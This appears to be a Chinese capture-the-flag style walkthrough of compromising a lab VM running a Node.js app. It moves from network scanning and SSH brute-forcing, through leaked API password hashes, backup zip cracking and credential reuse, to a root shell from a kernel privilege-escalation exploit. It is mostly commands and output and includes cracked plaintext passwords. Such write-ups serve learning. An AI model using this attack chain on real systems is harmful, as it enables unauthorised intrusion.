
sudo netdiscover -i eth0 -r 192.168.100.0/24

目标主机IP：192.168.100.152

sudo masscan --rate=10000 --ports 0-65535 192.168.100.152
	Discovered open port 22/tcp on 192.168.100.152                                 
	Discovered open port 3000/tcp on 192.168.100.152               

sudo nmap -A 192.168.100.152
	22/tcp   open  ssh             OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
	3000/tcp open  hadoop-datanode Apache Hadoop


whatweb 192.168.100.152:3000
	http://192.168.100.152:3000 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, IP[192.168.100.152], JQuery, Script[text/javascript], Title[MyPlace], X-Powered-By[Express], X-UA-Compatible[IE=edge]

dirsearch  -u http://192.168.100.152:3000
	[08:37:17] 301 -  171B  - /assets  ->  /assets/                          
	[08:39:17] 301 -  173B  - /uploads  ->  /uploads/  

sudo docker run j3ssie/jaeles scan -u 192.168.100.152:3000

hydra -L top500.txt -P top6000.txt  192.168.100.152  ssh  

msf
use auxiliary/scanner/ssh/ssh_version
options
set rhosts 192.168.100.152
run
	SSH server version: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2 ( service.version=7.2p2 openssh.comment=Ubuntu-4ubuntu2.2 service.vendor=OpenBSD service.family=OpenSSH service.product=OpenSSH service.cpe23=cpe:/a:openbsd:openssh:7.2p2 os.vendor=Ubuntu os.family=Linux os.product=Linux os.version=16.04 os.cpe23=cpe:/o:canonical:ubuntu_linux:16.04 service.protocol=ssh fingerprint_db=ssh.banner )

sudo nikto -h 192.168.100.152:3000  

dirb http://192.168.100.152:3000  
	(!) WARNING: NOT_FOUND[] page not stable
dpkg -L dirb  
dirb http://192.168.100.152:3000 /usr/share/dirb/wordlists/big.txt
	(!) WARNING: NOT_FOUND[] page not stable

target -> site map-> engagement tools -> content discovery -> site map

192.168.100.152:3000/api/users/latest
[{"_id":"59a7368398aa325cc03ee51d","username":"tom","password":"f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240","is_admin":false},
{"_id":"59a7368e98aa325cc03ee51e","username":"mark","password":"de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73","is_admin":false},
{"_id":"59aa9781cced6f1d1490fce9","username":"rastating","password":"5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0","is_admin":false}]
tom	 spongebob   mark  snowflake

http://192.168.100.152:3000/api/users
[{"_id":"59a7365b98aa325cc03ee51c","username":"myP14ceAdm1nAcc0uNT","password":"dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af","is_admin":true},
myP14ceAdm1nAcc0uNT    manchester

打开下载的内容，看到一堆密文，通过最后的“=”可以猜测是经过base64加密的；

尝试以压缩包形式打开；
base64 -d myplace.backup > myplace

使用工具fcrackzip进行密码的破解
fcrackzip -v -b -u -c a -p magicaaaa myplace
-v 就是可以看到更多的信息 
-b 暴力破解 
-u 用zip去尝试 
-c 指定字符 a 就是说明密码是由小写字母组成的 
-p 弄一个初始化的密码 aaaaaa 如果是纯数字000000  当然这里的长度都是6 
	PASSWORD FOUND!!!!: pw == magicword

对于node.js而言我们首先要基本熟悉他的构架，其中 app.js：项目入口及程序启动文件。先查看app.js文件；

cat app.js | grep url
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';

ssh mark@192.168.100.152

mark@node:~$ cat /etc/issue
Ubuntu 16.04.3 LTS \n \l


通过searchsploit命令查找漏洞
searchsploit Ubuntu 16.04

选择倒数第三个对目标系统进行提权；
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Es | linux/local/44298.c

由于 /tmp文件的限制小，所以将文件上传到靶机的tmp文件下。
scp /usr/share/exploitdb/exploits/linux/local/44298.c mark@192.168.100.152:/tmp/


利用该漏洞进行本地提权
gcc -pthread 44298.c -o exp -lcrypt
mark@node:/tmp$ ./exp 
task_struct = ffff8800259c6200
uidptr = ffff880027fb6b44
spawning root shell
root@node:/tmp# whoami


前端页面中的js页面很重要，尤其是类似目录的信息；
密文最后如果是“=”或者“==”，可能该密文是经过base64加密的；
如果经过base64解密后不能查看信息，可以尝试将解密后的信息输出到文件，并以解压zip压缩包的形式打开；
了解搭建网站的框架，目录结构；对于node.js而言我们首先要基本熟悉他的构架，其中 app.js：项目入口及程序启动文件。一般先查看app.js文件；
